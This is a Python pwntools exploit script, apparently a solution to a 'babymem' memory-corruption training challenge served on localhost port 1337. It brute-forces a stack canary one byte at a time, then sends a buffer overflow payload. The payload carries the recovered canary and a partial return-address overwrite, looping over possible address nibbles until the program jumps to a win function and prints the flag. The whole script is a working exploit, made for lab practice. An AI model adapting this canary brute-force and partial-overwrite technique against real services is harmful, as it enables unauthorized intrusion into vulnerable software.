from pwn import *


# launch proc in background: ./challenge/babymem-level-15-1 &
# ps aux to see active proc --> kill <pid> (-9 to force it)

host = "localhost"
port = 1337

'''offset_to_canary = 72
base_payload = b'A' * offset_to_canary + b'\x00'
for start in range(74, 81):
    print(f'try start: {start} - {base_payload}')
    for i in range(256):
        print(f'try {i}')
        proc = remote(host, port)

        proc.recvuntil(b'size: ')
        proc.sendline(str(start).encode())
        proc.recvuntil(b'bytes)!\n')

        payload = base_payload + bytes([i])
        proc.send(payload)

        try:
            proc.recvuntil(b'*** stack smashing detected ***: terminated')
            print('stack smashing detected')
        except EOFError:
            print(f'found canary byte: {bytes([i])}')
            base_payload = payload
            print(f'{base_payload=}')
            break
        
        proc.close()


print(f'{payload=}')'''

payload = b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00p\xa7\x90\x90\xe2\x87\x13'
poss_bytes = ['05', '15', '25', '35', '45', '55', '65', '75', '85', '95', 'a5', 'b5', 'c5', 'd5', 'e5', 'f5']
offset_win_authed = p16(0x15c7)


for b in poss_bytes:
    hex_str = b + 'c7'
    offset_win_authed = p16(int(hex_str, 16))
    proc = remote(host, port)

    proc.recvuntil(b'size: ')
    proc.sendline(str(90).encode())

    proc.recvuntil(b'(up to 90 bytes)!\n')
    new_payload = payload + b'B' * 8 + offset_win_authed
    proc.send(new_payload)
    try:
        r = proc.recvuntil(b'}')
        # print(r)
        if b'pwn' in r:
            print(r)
            break
    except EOFError:
        pass
    proc.close()
